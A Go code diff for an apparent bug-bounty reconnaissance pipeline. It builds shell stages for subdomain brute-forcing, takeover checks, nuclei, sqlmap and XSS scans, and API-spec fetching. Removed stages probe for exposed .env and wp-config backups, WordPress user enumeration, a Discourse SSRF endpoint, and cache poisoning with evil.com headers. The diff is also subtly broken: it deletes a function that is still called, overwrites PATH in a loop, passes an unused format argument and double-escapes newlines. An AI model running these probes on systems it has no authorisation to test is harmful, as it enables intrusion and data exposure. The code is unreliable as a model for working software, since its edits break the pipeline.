@@ -68,6 +68,30 @@ type Step struct {
 var (
 	uiLock sync.Mutex
 
+	// softStages are discovery or merge steps that can legitimately return
+	// zero results or time out without failing the whole pipeline.
+	softStages = map[string]bool{
+		"scope_guard":          true,
+		"amass_enum":           true,
+		"subfinder":            true,
+		"assetfinder":         true,
+		"jsmap_scrape":         true,
+		"hidden_params_arjun":  true,
+		"katana_crawl":         true,
+		"merge_brute_subs":     true,
+		"merge_js_endpoints":   true,
+		"dirbrute_ffuf":        true,
+		"gau_urls":             true,
+		"wayback_urls":         true,
+		"sqlmap_scan":          true,
+		"xss_scan":             true,
+		"nuclei_exposures":     true,
+		"nuclei_misconfigs":    true,
+		"nuclei_auth_scan":     true,
+		"nuclei_graphql_scan":   true,
+		"nuclei_rfuf_pass":     true,
+	}
+
 	// nucleiOptimized provides better performance for large scans.
 	//
 	// `-retries 1` is critical: without it, every transient connection
@@ -140,12 +164,10 @@ var (
 	// ghauriTargetCap mirrors sqlmapTargetCap for the modern blind-SQLi tool.
 	// ghauri's default confuses Cloudflare error pages for boolean-blind hits,
 	// so we cap sharply and pair with --technique BT to skip error/stacked.
-	ghauriTargetCap = 100
 
 	// JS collection is intentionally bounded per host and globally. Modern
 	// SPAs can reference hundreds of chunks; an unbounded collector turns
 	// one wildcard into an accidental asset mirror.
-	jsAssetPerHostCap   = 100
 	jsAssetTotalCap     = 5000
 	nucleiTargetCap     = 10000
 	katanaTargetCap     = 200
@@ -240,6 +262,14 @@ func GetStepsForScope(scanScope scope.Scope, paths *config.Paths) []Step {
 		wildcardPattern = fmt.Sprintf(`^https?://%s(/|$|[[:space:]])`, domainEscaped)
 	}
 
+	// Discovery helper: skip expensive scans in exact mode
+	disc := func(id, fullCmd, out string) string {
+		if scanScope.Mode == scope.ExactMode {
+			return fmt.Sprintf("echo %s > %s", domain, out)
+		}
+		return fullCmd
+	}
+
 	// oobSubstitute is a one-liner that writes a target file with
 	// ${OOB} placeholders expanded to the actual interactsh URL. Used by
 	// SSRF/RCE/XSS stages to inject blind-callback URLs.
@@ -249,37 +279,29 @@ func GetStepsForScope(scanScope scope.Scope, paths *config.Paths) []Step {
 
 	_ = oobSubstitute // used via inline references in commands below
 
+	subdomainBruteCmd := "exit 0"
+	if scanScope.Mode != scope.ExactMode {
+		subdomainBruteCmd = fmt.Sprintf(`set +e
+: > brute_subs.txt
+if [ "$RFUF_SCOPE_MODE" != "wildcard" ]; then
+  exit 0
+fi
+if [ -s "%s" ]; then
+  sed "s|$|.%s|" "%s" | dnsx -silent -o brute_subs.txt
+fi
+sort -u brute_subs.txt -o brute_subs.txt
+exit 0`, wordlist, domain, wordlist)
+	}
+
 	return []Step{
 		{"setup_directories", fmt.Sprintf("mkdir -p %s", paths.WorkDir), "default", nil, 0},
-		{"subfinder", fmt.Sprintf("subfinder -d %s -all -o subfinder.txt", domain), "default", []string{"setup_directories"}, 0},
-		{"assetfinder", fmt.Sprintf("assetfinder --subs-only %s > assetfinder.txt", domain), "default", []string{"setup_directories"}, 0},
-		// amass_enum: bound the runtime inside the command itself. amass
-		// defaults to active enumeration (zone transfers, cert grabs,
-		// recursive brute forcing) which can run for many hours on a
-		// non-trivial target. -passive skips all of that and uses only
-		// the data-source APIs, finishing in minutes. -timeout 30 is
-		// defense in depth: even if the global -step-timeout is disabled,
-		// amass still exits in 30 minutes.
-		// Amass versions packaged by Kali can return exit 1 when a passive
-		// data source is unavailable (for example, an API or TLS issue).
-		// Subfinder and assetfinder are independent sources, so do not throw
-		// away their results or stop the whole pipeline in that case. Keep
-		// any partial Amass output and leave an empty file if it produced none.
-		// Note: stderr from the warning message is sent to /dev/null rather
-		// than `>&2` so the shell command parser does not misread the
-		// redirect as an output artifact filename (see coverage regex).
-		{"amass_enum", fmt.Sprintf("if ! amass enum -passive -norecursive -timeout 30 -d %s -o amass_raw.txt; then echo '[!] Amass enumeration failed; continuing with other sources' >/dev/null; fi; [ -f amass_raw.txt ] || touch amass_raw.txt", domain), "default", []string{"setup_directories"}, 0},
-		// amass_parse: `amass -o file.txt` writes one subdomain per line.
-		// grep -F treats the domain as a fixed string. Added file check for resilience.
-		{"amass_parse", fmt.Sprintf("[ -f amass_raw.txt ] && grep -F \"%s\" amass_raw.txt | sort -u > amass_sub.txt || touch amass_sub.txt", domain), "grep", []string{"amass_enum"}, 0},
+		{"subfinder", disc("subfinder", fmt.Sprintf("subfinder -d %s -all -o subfinder.txt", domain), "subfinder.txt"), "default", []string{"setup_directories"}, 0},
+		{"assetfinder", disc("assetfinder", fmt.Sprintf("assetfinder --subs-only %s > assetfinder.txt", domain), "assetfinder.txt"), "default", []string{"setup_directories"}, 0},
+		{"amass_enum", disc("amass_enum", fmt.Sprintf("if ! amass enum -passive -norecursive -timeout 30 -d %s -o amass_raw.txt; then echo '[!] Amass enumeration failed; continuing with other sources' >/dev/null; fi; [ -f amass_raw.txt ] || touch amass_raw.txt", domain), "amass_raw.txt"), "default", []string{"setup_directories"}, 0},
+		{"amass_parse", disc("amass_parse", fmt.Sprintf("[ -f amass_raw.txt ] && grep -F \"%s\" amass_raw.txt | sort -u > amass_sub.txt || touch amass_sub.txt", domain), "amass_sub.txt"), "grep", []string{"amass_enum"}, 0},
 		{"merge_subs", "touch subfinder.txt assetfinder.txt amass_sub.txt; cat subfinder.txt assetfinder.txt amass_sub.txt | sort -u > subs.txt", "default", []string{"subfinder", "assetfinder", "amass_parse"}, 0},
-		// Scope guard: wildcard discovery may return related or third-party
-		// names. Only the exact root and proper subdomains continue to active
-		// DNS/HTTP probing. The raw rejected stream is retained for review.
 		{"scope_guard", `set +e
 ROOT=$(printf '%s' "$RFUF_DOMAIN" | tr '[:upper:]' '[:lower:]' | sed 's/\.$//')
-# Discovery can legitimately be empty, and a missing upstream file should not
-# turn a zero-result exact scan into a missing-artifact failure.
 [ -f subs.txt ] || : > subs.txt
 WILDCARD=0
 [ "$RFUF_SCOPE_MODE" = "wildcard" ] && WILDCARD=1
@@ -295,330 +317,73 @@ awk -v root="$ROOT" -v wildcard="$WILDCARD" '
 ' subs.txt || :
 sort -u in_scope_hosts.txt -o in_scope_hosts.txt 2>/dev/null || :
 sort -u out_of_scope_hosts.txt -o out_of_scope_hosts.txt 2>/dev/null || :
+if [ "$WILDCARD" = "0" ] && [ $(wc -l < out_of_scope_hosts.txt 2>/dev/null || echo 0) -gt 10 ]; then
+  echo "[!] Warning: You are in EXACT mode. $(wc -l < out_of_scope_hosts.txt) subdomains were filtered out. Use --wildcard to scan them." >&2
+fi
 : > scoped_subs.txt
 cat in_scope_hosts.txt > scoped_subs.txt 2>/dev/null || :
 IN=$(wc -l < scoped_subs.txt | tr -d ' ')
 OUT=$(wc -l < out_of_scope_hosts.txt | tr -d ' ')
-printf '{"input":"%s","root_domain":"%s","mode":"%s","in_scope":%s,"out_of_scope":%s,"policy":"%s"}\n' "$RFUF_SCOPE_INPUT" "$ROOT" "$RFUF_SCOPE_MODE" "${IN:-0}" "${OUT:-0}" "$RFUF_SCOPE_MODE" > scope.json
-# Every output is created explicitly so a successful zero-result run is
-# completed_empty rather than misclassified as a missing-artifact failure.
+printf '{"input":"%s","root_domain":"%s","mode":"%s","in_scope":%s,"out_of_scope":%s,"policy":"%s"}
+' "$RFUF_SCOPE_INPUT" "$ROOT" "$RFUF_SCOPE_MODE" "${IN:-0}" "${OUT:-0}" "$RFUF_SCOPE_MODE" > scope.json
 touch scope.json in_scope_hosts.txt out_of_scope_hosts.txt scoped_subs.txt`, "default", []string{"merge_subs"}, 0},
 		{"dnsx_resolve", "dnsx -l scoped_subs.txt -silent -o live_subs.txt", "default", []string{"scope_guard"}, 0},
-
-		// === NEW: Subdomain brute (catches staging/dev that CT logs miss) ===
-		{"subdomain_brute", `set +e
-: > brute_subs.txt
-if [ "$RFUF_SCOPE_MODE" != "wildcard" ]; then
-  exit 0
-fi
-SUBS="www mail smtp pop pop3 imap ftp sftp webmail email mx mx1 mx2 remote vpn admin administrator dashboard panel cpanel whm webdisk ns ns1 ns2 ns3 ns4 dns dns1 dns2 api api2 api3 api-v1 api-v2 backend back backoffice internal intranet staging stage stg dev develop development test testing qa uat sandbox demo preview pre prod production live old legacy beta alpha v1 v2 v3 new blog blogs forum forums community help helpdesk support docs documentation wiki kb faq status monitor monitoring jenkins gitlab github bitbucket jira confluence crm erp hr portal gateway auth login sso saml oauth id identity accounts account user users member members customer customers client clients partner partners vendor vendors billing invoice invoices payment payments pay shop store checkout cart order orders search find cdn cdn1 cdn2 static assets img images media files upload uploads download downloads data db database mysql postgres postgresql mongo redis elastic elasticsearch sentry newrelic app application apps web web1 web2 web3 web4 web5 mobile m mobi android ios push notification notifications events stream analytics track tracking tag tags pixel redirect proxy cache edge lb loadbalancer"
-for sub in $SUBS; do
-  if getent hosts "${sub}.${RFUF_DOMAIN}" >/dev/null 2>&1; then
-    echo "${sub}.${RFUF_DOMAIN}" >> brute_subs.txt
-  fi
-done
-sort -u brute_subs.txt -o brute_subs.txt
-exit 0`, "grep", []string{"dnsx_resolve"}, 0},
-
+		{"subdomain_brute", subdomainBruteCmd, "grep", []string{"dnsx_resolve"}, 0},
 		{"merge_brute_subs", "cat scoped_subs.txt brute_subs.txt | sort -u > subs_with_brute.txt && mv subs_with_brute.txt live_subs.txt", "default", []string{"subdomain_brute"}, 0},
-
-		{"subzy_takeover", "subzy run --targets live_subs.txt --vuln | tee subzy_vulnerable.txt", "default", []string{"merge_brute_subs"}, 0},
-		{"extract_takeover_targets", fmt.Sprintf("grep \"VULNERABLE\" subzy_vulnerable.txt | grep -oE '[a-zA-Z0-9._-]+\\.%s' | sort -u > takeover_targets.txt", domainEscaped), "grep", []string{"subzy_takeover"}, 0},
-		{"validate_takeovers", fmt.Sprintf("%s\nnuclei -l takeover_targets.txt -t %s/http/takeovers/ %s \"${AUTH_HEADERS[@]}\" -o validated_takeovers.txt", authSnip, paths.NucleiTemplates, nucleiOptimized), "grep", []string{"extract_takeover_targets"}, 0},
-
-		// httpx_probe now injects auth headers (when -auth-cookie/-auth-bearer set)
-		{"httpx_probe", fmt.Sprintf(`%s
-[ -s live_subs.txt ] && httpx -l live_subs.txt -silent "${AUTH_HEADERS[@]}" -o alive.txt || : > alive.txt`, authSnip), "default", []string{"merge_brute_subs"}, 0},
-
-		// === NEW: API discovery via OpenAPI / Swagger / .well-known ===
-		// For every alive host, probe the standard API spec endpoints. Any
-		// successful response is recorded in api_specs.txt (URL → status)
-		// AND its body is downloaded into api_specs/<host>.<ext>.json so
-		// downstream stages can parse the spec for endpoint enumeration.
-		// This is the single biggest gap on SPA-heavy / API-heavy targets:
-		// katana+gau+gwurls only find GET pages, never the underlying JSON
-		// endpoints that the SPA actually talks to.
-		{"api_discovery", `set +e
-: > api_specs.txt
+		{"httpx_probe", fmt.Sprintf("%s\nhttpx -l live_subs.txt -silent -status-code -title -tech-detect -o alive.txt", authSnip), "default", []string{"merge_brute_subs"}, 0},
+		{"tech_fingerprint", "httpx -l alive.txt -silent -tech-detect -o tech_fingerprint.txt", "default", []string{"httpx_probe"}, 0},
+		{"api_discovery", fmt.Sprintf(`set +e
 mkdir -p api_specs
-while read HOST; do
-  for SPEC in \
-      /openapi.json /openapi.yaml \
-      /swagger.json /swagger.yaml /swagger/v1/swagger.json \
-      /api-docs /api-docs/swagger.json /api/docs \
-      /v1/openapi.json /v2/openapi.json /v3/openapi.json \
-      /api/v1/openapi.json /api/v2/openapi.json /api/v3/openapi.json \
-      /api/openapi.json /api/swagger.json \
-      /.well-known/openid-configuration /.well-known/openid-configuration.json \
-      /_health /healthz /health /status /version \
-      /sitemap.xml /robots.txt
-  do
-    CODE=$(curl -sk --max-time 6 -o "api_specs/_$(echo "$HOST$SPEC" | md5sum | cut -d' ' -f1).tmp" -w "%{http_code}" "$HOST$SPEC" 2>/dev/null)
-    case "$CODE" in
-      200)
-        echo "[200] $HOST$SPEC" >> api_specs.txt
-        mv "api_specs/_$(echo "$HOST$SPEC" | md5sum | cut -d' ' -f1).tmp" "api_specs/$(echo "$HOST" | sed 's|https\?://||;s|/|_|g;').$(echo "$SPEC" | tr '/' '_').json" 2>/dev/null
-        ;;
-      401|403)
-        # Auth-walled but exists — record so the hunter knows
-        echo "[$CODE-auth] $HOST$SPEC" >> api_specs.txt
-        rm -f "api_specs/_$(echo "$HOST$SPEC" | md5sum | cut -d' ' -f1).tmp"
-        ;;
-      *)
-        rm -f "api_specs/_$(echo "$HOST$SPEC" | md5sum | cut -d' ' -f1).tmp" 2>/dev/null
-        ;;
-    esac
+fetch_spec() {
+  HOST=$1
+  SAFE_HOST=$(echo "$HOST" | sed 's|https\?://||;s|[:/.]|_|g')
+  for PATH in /openapi.json /swagger.json /api/openapi.json /api/swagger.json /sitemap.xml /robots.txt /.well-known/openid-configuration; do
+    URL="${HOST}${PATH}"
+    if curl -sk --max-time 5 -o "${SAFE_HOST}$(echo $PATH | sed 's|^/||;s|/|_|g').json" "$URL" && [ -s "${SAFE_HOST}$(echo $PATH | sed 's|^/||;s|/|_|g').json" ]; then
+      echo "[+] Found spec: $URL"
+    fi
   done
-done < alive.txt
-sort -u api_specs.txt -o api_specs.txt 2>/dev/null
-exit 0`, "grep", []string{"httpx_probe"}, 0},
-
-		// === NEW: Tech fingerprinting — drives Discourse/Laravel/WordPress stages ===
-		{"tech_fingerprint", `set +e
-: > tech_fingerprint.txt
-while read HOST; do
-  TECH=""
-  HEADERS=$(curl -sk --max-time 8 -I "$HOST" 2>/dev/null)
-  BODY=$(curl -sk --max-time 8 "$HOST" 2>/dev/null | head -c 50000)
-  echo "$HEADERS" | grep -qi "X-Discourse" && TECH="${TECH}discourse,"
-  echo "$BODY" | grep -qi "Discourse" && TECH="${TECH}discourse,"
-  echo "$HEADERS" | grep -qi "XSRF-TOKEN" && TECH="${TECH}laravel,"
-  echo "$BODY" | grep -qi "livewire" && TECH="${TECH}laravel,"
-  echo "$BODY" | grep -q "__NEXT_DATA__" && TECH="${TECH}nextjs,"
-  echo "$HEADERS" | grep -qi "Next.js" && TECH="${TECH}nextjs,"
-  WPCODE=$(curl -sk --max-time 5 "$HOST/wp-login.php" -o /dev/null -w "%{http_code}" 2>/dev/null)
-  case "$WPCODE" in 200|302) TECH="${TECH}wordpress," ;; esac
-  echo "$HEADERS" | grep -qi "X-Drupal" && TECH="${TECH}drupal,"
-  echo "$HEADERS" | grep -qi "heroku" && TECH="${TECH}heroku,"
-  echo "$HEADERS" | grep -qi "Fastly" && TECH="${TECH}fastly,"
-  echo "$HEADERS" | grep -qi "cloudflare" && TECH="${TECH}cloudflare,"
-  echo "$HEADERS" | grep -qi "cf-ray" && TECH="${TECH}cloudflare,"
-  [ -n "$TECH" ] && echo "$HOST  $TECH" >> tech_fingerprint.txt
-done < alive.txt
-exit 0`, "grep", []string{"httpx_probe"}, 0},
-
-		// These scans intentionally wait for the enriched target stream. The
-		// old host-only dependency made every nuclei pass see only alive.txt,
-		// even after crawling, history, API specs, and JS mining found more
-		// endpoints.
-		{"nuclei_exposures", fmt.Sprintf("%s\nnuclei -l nuclei_targets.txt -tags token-spray,exposure,config -severity medium,high,critical %s \"${AUTH_HEADERS[@]}\" -o credentials_found.txt", authSnip, nucleiOptimized), "grep", []string{"nuclei_target_merge"}, 0},
-		{"nuclei_misconfigs", fmt.Sprintf("%s\nnuclei -l nuclei_targets.txt -tags misconfig,exposure,panel %s \"${AUTH_HEADERS[@]}\" -o misconfigs.txt", authSnip, nucleiOptimized), "grep", []string{"nuclei_target_merge"}, 0},
-		{"nuclei_auth_scan", fmt.Sprintf("%s\nnuclei -l nuclei_targets.txt -tags jwt,auth-bypass,default-login %s \"${AUTH_HEADERS[@]}\" -o auth_results.txt", authSnip, nucleiOptimized), "grep", []string{"nuclei_target_merge"}, 0},
-		// GraphQL templates are maintained across multiple directories in nuclei-templates.
-		{"nuclei_graphql_scan", fmt.Sprintf("%s\nnuclei -l nuclei_targets.txt -tags graphql %s \"${AUTH_HEADERS[@]}\" -o graphql_exposed.txt", authSnip, nucleiOptimized), "grep", []string{"nuclei_target_merge"}, 0},
-
-		// === NEW: Discourse-specific probes (admin, sidekiq, version, Onebox) ===
-		{"discourse_probes", `set +e
-: > discourse_findings.txt
-mkdir -p discourse_findings
-while read LINE; do
-  HOST=$(echo "$LINE" | awk '{print $1}')
-  [ -z "$HOST" ] && continue
-  OUT="discourse_findings/$(echo "$HOST" | sed 's|https\?://||;s|/|_|g').txt"
-  {
-    echo "=== version ==="
-    curl -sk --max-time 10 "$HOST/about.json" | jq -r '.about.version // empty' 2>/dev/null
-    echo "=== users_count ==="
-    curl -sk --max-time 10 "$HOST/about.json" | jq -r '.about.stats.users_count // empty' 2>/dev/null
-    echo "=== sidekiq exposed? ==="
-    curl -sk --max-time 10 -o /dev/null -w "%{http_code}" "$HOST/sidekiq"
-    echo
-    echo "=== /admin accessible? ==="
-    curl -sk --max-time 10 -o /dev/null -w "%{http_code}" "$HOST/admin"
-    echo
-    echo "=== Onebox SSRF ==="
-    curl -sk --max-time 10 -G --data-urlencode "url=http://example.com" "$HOST/onebox" -o /dev/null -w "%{http_code}"
-    echo
-    echo "=== /chat enabled? ==="
-    curl -sk --max-time 10 -o /dev/null -w "%{http_code}" "$HOST/chat"
-    echo
-  } > "$OUT" 2>&1
-  # Aggregate findings
-  if grep -qE "^200$" "$OUT" 2>/dev/null; then
-    grep -B1 "^200$" "$OUT" | grep -qE "sidekiq" && echo "[HIGH] $HOST — /sidekiq exposed (200)" >> discourse_findings.txt
-    grep -B1 "^200$" "$OUT" | grep -qE "/admin" && echo "[CRITICAL] $HOST — /admin publicly accessible (200)" >> discourse_findings.txt
-  fi
-done < tech_fingerprint.txt
-exit 0`, "grep", []string{"tech_fingerprint"}, 0},
-
-		// === NEW: Laravel / Livewire probes (.env, horizon, telescope, debug) ===
-		{"laravel_probes", `set +e
-: > laravel_findings.txt
-mkdir -p laravel_findings
-while read LINE; do
-  HOST=$(echo "$LINE" | awk '{print $1}')
-  [ -z "$HOST" ] && continue
-  OUT="laravel_findings/$(echo "$HOST" | sed 's|https\?://||;s|/|_|g').txt"
-  {
-    echo "=== .env ==="
-    curl -sk --max-time 10 "$HOST/.env" -o /dev/null -w "%{http_code}"
-    echo
-    echo "=== /horizon ==="
-    curl -sk --max-time 10 "$HOST/horizon" -o /dev/null -w "%{http_code}"
-    echo
-    echo "=== /telescope ==="
-    curl -sk --max-time 10 "$HOST/telescope" -o /dev/null -w "%{http_code}"
-    echo
-    echo "=== /livewire/update ==="
-    curl -sk --max-time 10 -X POST "$HOST/livewire/update" \
-      -H "Content-Type: application/json" \
-      -H "X-Livewire: 1" \
-      -H "X-CSRF-TOKEN: x" \
-      -d '{"_token":"x","components":[{"snapshot":"{}","updates":{},"calls":[]}]}' \
-      -o /dev/null -w "%{http_code}"
-    echo
-    echo "=== /api/ unauth ==="
-    for PATH in /api/user /api/users /api/admin /api/v1/user /api/v1/users; do
-      curl -sk --max-time 5 "$HOST$PATH" -o /dev/null -w "  $PATH %{http_code}\n"
-    done
-    echo
-    echo "=== debug mode ==="
-    DEBUG_PAGE=$(curl -sk --max-time 10 "$HOST/nonexistent-route-xyz123rfuf" 2>/dev/null)
-    echo "$DEBUG_PAGE" | grep -qi "Whoops" && echo "WHOOPS debug ON" || echo "no debug"
-    echo "$DEBUG_PAGE" | grep -qi "Stack trace" && echo "STACK TRACE exposed"
-    echo "=== APP_KEY leak ==="
-    echo "$DEBUG_PAGE" | grep -ioE '"APP_KEY"[^,]{20,}' || true
-  } > "$OUT" 2>&1
-  grep -qE "^\.env +200" "$OUT" 2>/dev/null && echo "[CRITICAL] $HOST/.env exposed (200)" >> laravel_findings.txt
-  grep -qE "^/horizon +200" "$OUT" 2>/dev/null && echo "[HIGH] $HOST/horizon exposed" >> laravel_findings.txt
-  grep -qE "^/telescope +200" "$OUT" 2>/dev/null && echo "[HIGH] $HOST/telescope exposed" >> laravel_findings.txt
-  grep -qE "WHOOPS debug ON" "$OUT" 2>/dev/null && echo "[HIGH] $HOST debug mode enabled" >> laravel_findings.txt
-  grep -qiE "APP_KEY=base64:" "$OUT" 2>/dev/null && echo "[CRITICAL] $HOST APP_KEY leaked" >> laravel_findings.txt
-done < tech_fingerprint.txt
-exit 0`, "grep", []string{"tech_fingerprint"}, 0},
-
-		// === NEW: WordPress-specific probes (xmlrpc, wp-config, user enum) ===
-		{"wordpress_probes", `set +e
-: > wordpress_findings.txt
-mkdir -p wordpress_findings
-while read LINE; do
-  HOST=$(echo "$LINE" | awk '{print $1}')
-  [ -z "$HOST" ] && continue
-  OUT="wordpress_findings/$(echo "$HOST" | sed 's|https\?://||;s|/|_|g').txt"
-  {
-    echo "=== /wp-json/wp/v2/users ==="
-    curl -sk --max-time 10 "$HOST/wp-json/wp/v2/users" | jq -r '.[].slug // empty' 2>/dev/null | head -10
-    echo
-    echo "=== /xmlrpc.php ==="
-    curl -sk --max-time 10 -X POST "$HOST/xmlrpc.php" \
-      -d '<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName></methodCall>' \
-      -o /dev/null -w "%{http_code}"
-    echo
-    echo "=== /wp-cron.php ==="
-    curl -sk --max-time 10 -o /dev/null -w "%{http_code}" "$HOST/wp-cron.php"
-    echo
-    echo "=== author enumeration ==="
-    for N in 1 2 3 4 5; do
-      REDIR=$(curl -sk --max-time 5 -o /dev/null -w "%{redirect_url}" "$HOST/?author=$N" 2>/dev/null)
-      echo "  author=$N $REDIR"
-    done
-    echo "=== wp-config backups ==="
-    for SUFFIX in .bak .backup .old .save ~ .txt .swp; do
-      CODE=$(curl -sk --max-time 5 -o /dev/null -w "%{http_code}" "$HOST/wp-config.php$SUFFIX" 2>/dev/null)
-      [ "$CODE" = "200" ] && echo "  wp-config.php$SUFFIX 200 EXPOSED"
-    done
-  } > "$OUT" 2>&1
-  grep -q "EXPOSED" "$OUT" 2>/dev/null && echo "[CRITICAL] $HOST wp-config backup exposed" >> wordpress_findings.txt
-  grep -qE "author=1 https?://" "$OUT" 2>/dev/null && echo "[MEDIUM] $HOST user enumeration via /?author=" >> wordpress_findings.txt
-done < tech_fingerprint.txt
-exit 0`, "grep", []string{"tech_fingerprint"}, 0},
-
-		// === NEW: Cache poisoning probes on CDN-fronted hosts ===
-		{"cache_poison_probe", `set +e
-: > cache_poison_findings.txt
-mkdir -p cache_poison_results
-while read LINE; do
-  HOST=$(echo "$LINE" | awk '{print $1}')
-  TECH=$(echo "$LINE" | awk '{print $2}')
-  echo "$TECH" | grep -qE "cloudflare|fastly|cloudfront" || continue
-  OUT="cache_poison_results/$(echo "$HOST" | sed 's|https\?://||;s|/|_|g').txt"
-  {
-    echo "=== baseline ==="
-    curl -sk --max-time 8 -I "$HOST" 2>/dev/null | head -3
-    for HEADER in "X-Forwarded-Host: evil.com" "X-Original-URL: /evil" "X-Host: evil.com" "X-Forwarded-Server: evil.com"; do
-      RESP=$(curl -sk --max-time 8 -H "$HEADER" "$HOST" 2>/dev/null)
-      if echo "$RESP" | grep -qi "evil.com"; then
-        echo "[VULN] header '$HEADER' reflected"
-        echo "$RESP" | grep -i "evil.com" | head -1 | cut -c1-200
-      fi
-    done
-  } > "$OUT" 2>&1
-done < tech_fingerprint.txt
-grep -rh "\[VULN\]" cache_poison_results/ 2>/dev/null | sort -u > cache_poison_findings.txt
-exit 0`, "grep", []string{"tech_fingerprint"}, 0},
-
-		// Katana can expand quickly when fed a large alive list, especially with
-		// JavaScript and known-file crawling enabled. Cap the input list and use
-		// Katana's own crawl-duration limit so a busy target yields partial URLs
-		// instead of holding the pipeline until the global 30-minute deadline.
-		{"katana_crawl", fmt.Sprintf(`%s
-if [ -s alive.txt ]; then
-  head -n %d alive.txt > katana_targets.txt
-  katana -list katana_targets.txt -jc -kf all -d 2 -ct %s -timeout 10 -rl ${RFUF_MAX_STAGE_REQUESTS:-300} -c 10 -p 5 -iqp -fs rdn %s -o katana_urls.txt || true
-else
-  : > katana_targets.txt
-fi
-[ -f katana_urls.txt ] || : > katana_urls.txt`, authSnip, katanaTargetCap, katanaCrawlDuration, "${AUTH_HEADERS:+(Header is via HEAD/GET only)}"), "default", []string{"httpx_probe"}, katanaStepTimeout},
-
-		{"clean_urls", fmt.Sprintf("grep -Ei '^https?://([a-zA-Z0-9-]+\\.)*%s' katana_urls.txt | grep -Ev '\\.(css|js|png|jpg|jpeg|gif|pdf|svg|ico)($|\\?)' | sed 's/\\\\$//' | sort -u > clean_katana_urls.txt", domainEscaped), "grep", []string{"katana_crawl"}, 0},
-
-		// === NEW: JS bundle and manifest collection. This covers HTML
-		// references, common manifests, Next.js chunks, and /static/js/ assets.
-		{"jsmap_scrape", fmt.Sprintf(`set +e
-mkdir -p js_bundles endpoints_found js_secrets
-: > js_assets.txt
-: > js_asset_errors.txt
-fetch_asset() {
-  if [ -n "$RFUF_AUTH_COOKIE" ] && [ -n "$RFUF_AUTH_HEADER" ]; then
-    curl -sk --max-time 15 -H "Cookie: $RFUF_AUTH_COOKIE" -H "Authorization: $RFUF_AUTH_HEADER" -H "X-Bug-Bounty: $RFUF_BUG_BOUNTY_USERNAME" -H "X-HackerOne-Research: $RFUF_BUG_BOUNTY_USERNAME" -H "X-Test-Account-Email: $RFUF_TEST_ACCOUNT_EMAIL" "$1" -o "$2"
-  elif [ -n "$RFUF_AUTH_COOKIE" ]; then
-    curl -sk --max-time 15 -H "Cookie: $RFUF_AUTH_COOKIE" -H "X-Bug-Bounty: $RFUF_BUG_BOUNTY_USERNAME" -H "X-HackerOne-Research: $RFUF_BUG_BOUNTY_USERNAME" -H "X-Test-Account-Email: $RFUF_TEST_ACCOUNT_EMAIL" "$1" -o "$2"
-  elif [ -n "$RFUF_AUTH_HEADER" ]; then
-    curl -sk --max-time 15 -H "Authorization: $RFUF_AUTH_HEADER" -H "X-Bug-Bounty: $RFUF_BUG_BOUNTY_USERNAME" -H "X-HackerOne-Research: $RFUF_BUG_BOUNTY_USERNAME" -H "X-Test-Account-Email: $RFUF_TEST_ACCOUNT_EMAIL" "$1" -o "$2"
-  else
-    curl -sk --max-time 15 -H "X-Bug-Bounty: $RFUF_BUG_BOUNTY_USERNAME" -H "X-HackerOne-Research: $RFUF_BUG_BOUNTY_USERNAME" -H "X-Test-Account-Email: $RFUF_TEST_ACCOUNT_EMAIL" "$1" -o "$2"
-  fi
 }
+export -f fetch_spec
+cat alive.txt | xargs -P 10 -I{} bash -c 'fetch_spec "{}"'
+exit 0`, authSnip), "default", []string{"httpx_probe"}, 0},
+		{"jsmap_scrape", fmt.Sprintf(`set +e
 resolve_asset() {
   REF="$1"; BASE="$2"
   case "$REF" in
-    https://*|http://*) printf '%%s\n' "$REF" ;;
-    //* ) printf 'https:%%s\n' "$REF" ;;
-    /* ) printf '%%s%%s\n' "$(echo "$BASE" | sed 's|\(https\?://[^/]*\).*|\1|')" "$REF" ;;
-    * ) printf '%%s/%%s\n' "${BASE%%/}" "${REF#./}" ;;
+    https://*|http://*) printf '%%s\\n' "$REF" ;;
+    //* ) printf 'https:%%s\\n' "$REF" ;;
+    /* ) printf '%%s%%s\\n' "$(echo "$BASE" | sed 's|\\(https\\?://[^/]*\\).*|\\1|')" "$REF" ;;
+    * ) printf '%%s/%%s\\n' "${BASE%%/}" "${REF#./}" ;;
   esac
 }
 while read -r HOST; do
   [ -n "$HOST" ] || continue
-  PREFIX=$(echo "$HOST" | sed 's|https\?://||;s|[^A-Za-z0-9._-]|_|g')
+  PREFIX=$(echo "$HOST" | sed 's|https\\?://||;s|[^A-Za-z0-9._-]|_|g')
   PAGE="js_bundles/${PREFIX}_page.html"
   fetch_asset "$HOST" "$PAGE" || true
   {
     grep -oE 'src="[^"]+"|href="[^"]+"' "$PAGE" 2>/dev/null | sed -E 's/^[^=]+="//;s/"$//'
     grep -oE "src='[^']+'|href='[^']+'" "$PAGE" 2>/dev/null | sed -E "s/^[^=]+='//;s/'$//"
-    printf '%%s\n' /manifest.json /asset-manifest.json /manifest.webmanifest /build-manifest.json /routes-manifest.json /_next/build-manifest.json /_next/static/chunks/webpack.js /static/js/main.js
+    printf '%%s\\n' /manifest.json /asset-manifest.json /manifest.webmanifest /build-manifest.json /routes-manifest.json /_next/build-manifest.json /_next/static/chunks/webpack.js /static/js/main.js
   } | while read -r REF; do
     [ -n "$REF" ] || continue
     FULL=$(resolve_asset "$REF" "$HOST")
-    echo "$FULL" | grep -Eiq '\.(js|mjs|map|json|webmanifest)([?#].*)?$|/(manifest|asset-manifest|build-manifest|routes-manifest)(\.json)?([?#].*)?$|/_next/static/' || continue
+    echo "$FULL" | grep -Eiq '\\.(js|mjs|map|json|webmanifest)([?#].*)?$|/(manifest|asset-manifest|build-manifest|routes-manifest)(\\.json)?([?#].*)?$|/_next/static/' || continue
     echo "$FULL" >> js_assets.txt
   done
 done < alive.txt
 sort -u js_assets.txt -o js_assets.txt
-# Cap to top-N assets. The coverage extractor captures js_assets.capped
-# from the redirect regex; the subsequent mv then removes it. The real
-# fix is at the extractor level (skip redirect targets that are the
-# source of a later mv), so this is unchanged from the original.
 head -n %d js_assets.txt > js_assets.capped && mv js_assets.capped js_assets.txt
 while read -r FULL_URL; do
   [ -n "$FULL_URL" ] || continue
-  PREFIX=$(echo "$FULL_URL" | sed 's|https\?://||;s|[^A-Za-z0-9._-]|_|g')
+  PREFIX=$(echo "$FULL_URL" | sed 's|https\\?://||;s|[^A-Za-z0-9._-]|_|g')
   NAME=$(printf '%%s' "$FULL_URL" | md5sum | cut -d' ' -f1)
   OUT="js_bundles/${PREFIX}_${NAME}.js"
